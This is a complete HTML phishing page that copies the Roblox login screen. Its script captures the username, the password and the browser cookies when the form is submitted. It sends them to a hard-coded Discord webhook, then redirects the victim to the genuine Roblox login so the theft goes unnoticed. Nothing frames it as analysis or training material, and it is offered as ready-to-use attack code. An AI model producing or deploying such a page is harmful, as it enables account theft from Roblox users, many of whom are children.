<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Roblox</title>
<style>
*{margin:0;padding:0;font-family:'Segoe UI',Arial,sans-serif;box-sizing:border-box;}
body{background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh;}
.container{background:#2d2d44;padding:30px;border-radius:20px;width:400px;max-width:95%;}
.logo{font-size:40px;font-weight:bold;color:#fff;text-align:center;margin-bottom:20px;}
.logo span{color:#f03;}
input{width:100%;padding:16px;margin:10px 0;border:none;border-radius:12px;background:#1e1e32;color:#fff;font-size:16px;}
input::placeholder{color:#888;}
button{width:100%;padding:16px;background:#f03;border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;margin:10px 0;}
button:hover{background:#d0021b;}
.links{color:#aaa;font-size:14px;text-align:center;margin:10px 0;}
.links a{color:#4af;text-decoration:none;}
.links a:hover{text-decoration:underline;}
.footer{color:#666;font-size:12px;text-align:center;margin-top:20px;}
</style>
</head>
<body>
<div class="container">
<div class="logo">R<span>®</span>BLOX</div>
<form id="loginForm">
<input type="text" name="username" placeholder="Username/Email/Phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button>
</form>
<div class="links">
<a href="#">Forgot Password or Username?</a><br>
<a href="#">Email Me a One-Time Code</a><br>
<a href="#">Quick Sign-in</a><br>
<a href="#">Create A New Account</a>
</div>
<div class="footer">© 2026 Roblox Corporation</div>
</div>
<script>
const webhook = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1542080761824415845/ZOhnDbcjsowcF2U-n-E1eEdPW3VjROE2F2MuCmJlqW7r4xP-zdccNDGpCS6oH3A0_dtb";
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    let u = document.querySelector('input[name="username"]').value;
    let p = document.querySelector('input[name="password"]').value;
    let c = document.cookie;
    fetch(webhook, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: `User: ${u}\nPass: ${p}\nCookie: ${c}`})
    }).then(() => {
        window.location.href = 'https://www.roblox.com/login';
    });
});
</script>
</body>
</html>
